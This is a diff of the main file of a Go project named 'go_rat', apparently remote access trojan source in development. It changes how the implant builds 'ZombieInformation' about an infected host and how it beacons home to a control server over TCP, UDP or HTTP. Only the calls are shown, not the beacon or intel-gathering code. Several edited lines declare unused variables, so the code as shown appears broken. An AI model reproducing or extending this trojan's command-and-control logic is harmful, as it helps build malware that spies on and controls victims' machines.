@@ -25,7 +25,7 @@ import (
 
 
 	/*/
-	"go_rat/pkg/shared_code"
+
 	"go_rat/pkg/shared_code/Beacons"
 	"go_rat/pkg/shared_code/Core"
 	"go_rat/pkg/shared_code/Intel"
@@ -62,8 +62,8 @@ func main() {
 
 	// you should code these struct constructors to accept parameters to assign values
 	// or should I? This is stil in development
-	CommandPool := shared_code.NewCommandSet()
-	ZombieInformation := shared_code.NewHostIntel()
+	CommandPool := Core.NewCommandSet()
+	ZombieInformation := Core.NewHostIntel()
 
 	// start gathering all the info
 	// even though the Intel Folder/Module is in the shared_code module
@@ -73,13 +73,14 @@ func main() {
 	if Core.BEACON_ON_START == true {
 		switch Core.BACON_TYPE {
 		case "tcp":
-			go Beacons.BaconTCP(Core.PHONEHOME_TCP)
+			tcp_connection, derp := Beacons.BaconTCP(Core.PHONEHOME_TCP)
 		case "udp":
-			go Beacons.BeaconUDP(Core.PHONEHOME_UDP)
+			Beacons.BeaconUDP(Core.PHONEHOME_UDP)
 		case "http":
 			// function to call other beacons depending on second param
-			go Beacons.BeaconHTTP()
+			http_response, derp := Beacons.BeaconHTTP(Core.Remote_http_addr, Core.BEACONHTTPTYPE)
+
 		}
 	}
-	shared_code.GetTCPConnections()
+
 }
